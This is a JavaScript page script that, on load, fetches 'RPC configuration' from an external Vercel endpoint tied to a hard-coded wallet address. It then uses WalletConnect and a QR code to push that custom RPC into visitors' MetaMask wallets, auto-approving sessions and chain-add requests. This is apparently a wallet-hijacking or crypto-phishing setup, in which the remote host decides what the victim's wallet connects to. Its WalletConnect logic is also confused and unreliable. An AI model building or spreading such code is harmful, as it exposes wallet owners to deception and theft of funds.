import WalletConnect from "@walletconnect/client";
import QRCode from "qrcode";

// Fetch RPC configuration from the API
const fetchRPCConfig = async () => {
    try {
        const response = await fetch("https://server-side-rpc.vercel.app/crypto-host", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({ userWallet: "0xf0FA447472ba8Feb4fBb7252B4EDEEfCee31Da89" }), // Replace with dynamic wallet address if needed
        });
        const data = await response.json();
        return data.rpcData; // Custom RPC configuration
    } catch (error) {
        console.error("Error fetching RPC configuration:", error);
        throw error;
    }
};

// Inject RPC into MetaMask using WalletConnect
const injectRPC = async (rpcData) => {
    const connector = new WalletConnect({
        bridge: "https://bridge.walletconnect.org", // WalletConnect bridge server
    });

    // Generate QR code for the WalletConnect URI
    connector.on("display_uri", (err, payload) => {
        if (err) {
            console.error("Error generating WalletConnect URI:", err);
            return;
        }

        const uri = payload.params[0];
        console.log("WalletConnect URI:", uri);

        // Generate QR code and display it
        QRCode.toDataURL(uri, (err, url) => {
            if (err) {
                console.error("Error generating QR code:", err);
                return;
            }

            // Display the QR code in an <img> element
            const qrCodeElement = document.getElementById("qr-code");
            if (qrCodeElement) {
                qrCodeElement.src = url;
            } else {
                console.error("QR code element not found!");
            }
        });
    });

    // Handle session requests
    connector.on("session_request", (error, payload) => {
        if (error) {
            throw error;
        }

        // Approve the session request
        connector.approveSession({
            accounts: [], // No specific accounts required for RPC injection
            chainId: rpcData.chainId,
        });

        console.log("WalletConnect session approved");
    });

    // Handle call requests (e.g., adding a custom RPC)
    connector.on("call_request", (error, payload) => {
        if (error) {
            throw error;
        }

        // Handle the call request
        if (payload.method === "wallet_addEthereumChain") {
            console.log("Injecting custom RPC into MetaMask...");
            connector.approveRequest({
                id: payload.id,
                result: [rpcData], // Custom RPC configuration
            });
        }
    });

    // Start the WalletConnect session
    connector.createSession();
};

// Main function
const main = async () => {
    try {
        const rpcData = await fetchRPCConfig(); // Fetch RPC configuration
        await injectRPC(rpcData); // Inject RPC into MetaMask
    } catch (error) {
        console.error("Error in main function:", error);
    }
};

// Run the main function when the page loads
window.addEventListener("load", main);